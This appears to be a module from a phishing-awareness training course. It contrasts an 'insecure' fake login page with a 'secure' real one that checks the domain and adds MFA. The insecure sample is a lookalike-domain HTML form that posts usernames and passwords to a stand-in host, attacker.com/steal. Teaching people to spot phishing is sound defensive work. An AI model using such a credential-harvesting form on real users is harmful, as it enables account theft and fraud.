Module 7: Phishing Awareness

Phishing is a social engineering attack where an attacker creates a fraudulent communication (like an email) that appears to come from a reputable source. It often links to a fake login page that is visually identical to the real website, tricking users into typing their credentials into the attacker's database.

Insecure (Vulnerable)

Falling for the visual disguise instead of verifying the source.

<!-- INSECURE EXAMPLE (for learning only) -->
<!-- The Fake URL -->

URL: http://www.testing-app-support-login.com/login

<form action="http://attacker.com/steal" method="POST">
    <h2>Sign in to Testing App</h2>
    <!-- Looks exactly like our real login page -->
    <input type="text" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <button type="submit">Sign In</button>
</form>
Secure (Mitigated)

Verifying the domain and using Multi-Factor Authentication.

<!-- SECURE IMPLEMENTATION -->
<!-- The Real URL and MFA -->

URL: https://www.testingapp.com/login (Always check the domain!)

<form action="/login" method="POST">
    <h2>Sign in to Testing App</h2>
    <input type="text" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    
    <!-- Even if an attacker steals the password via phishing, -->
    <!-- they cannot log in without the physical MFA token. -->
    <input type="text" name="mfa_code" placeholder="Authenticator Code">
    
    <button type="submit">Sign In</button>
</form>
